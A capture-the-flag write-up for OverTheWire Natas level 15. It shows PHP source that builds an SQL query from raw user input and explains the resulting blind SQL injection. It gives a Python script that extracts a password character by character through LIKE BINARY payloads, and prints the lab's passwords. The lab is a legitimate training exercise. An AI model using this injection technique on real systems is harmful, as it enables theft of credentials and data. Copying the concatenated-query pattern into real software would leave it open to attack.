# Level 15

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org)
- username: `natas15`
- password: `TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB`

## Solution

![start](./start.jpg)

Let's analyze the sourcecode:

```php
...
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
...
```

We know, that we have table `users` with fields `username` and `password` and the query is `SELECT * from users where username="..."`, so as we will not have any output except about the user existance it will be `Blind SQL Injection`. What we can do is to build the more complex query, like: `SELECT * from users where username="natas16" and password like binary "%"#`, let's analyze it. It will select all users with username `natas16`, that have password like `"%"` *(it means any characters)* and the word `binary` means here, that it will not be case-insensitive. So instead of `%` we can input any characters and so check if the user exists. For example if user has password `123` and we send `...like binary "1%"` it will return true, because password starts with `1` and then have any characters. So let's send `natas16" and password like binary "%"#` to check it:

![check](./check.jpg)

So now we need to bruteforce each character one by one. For that we can write simple `python` script:

```py
import requests

# Base URL and endpoint of the target site
url = 'http://natas15.natas.labs.overthewire.org/index.php'

# Characters to test in the password
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Store the successfully found password
found_password = ''

# Function to make a POST request and check if the character is correct
def check_character(current_password):
    # Payload for POST request, updated with the correct SQL query structure
    payload = f'natas16" and password like binary "{current_password}%" #'

    # Headers including content type and manually added Authorization header
    headers = {
        'Authorization': 'Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas15.natas.labs.overthewire.org',
        'Referer': 'http://natas15.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request
    response = requests.post(url, headers=headers, data={'username': payload})
    # print(payload)
    # print(response.status_code, response.reason)  # Print status for debugging
    return "This user exists." in response.text

# Brute force the password character by character
for i in range(50):  # assumption max 50 characters
    found_this_iteration = False  # Flag to check if we found at least one character in this iteration
    for char in characters:
        test_password = found_password + char
        if check_character(test_password):
            found_password += char
            print(f'Found so far: {found_password}')
            found_this_iteration = True
            break
    if not found_this_iteration:
        print("No further characters found. Ending search.")
        break

print(f'Complete password: {found_password}')
```

## Password

`natas16`:`TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`

*Created by [bu19akov](https://github.com/bu19akov)*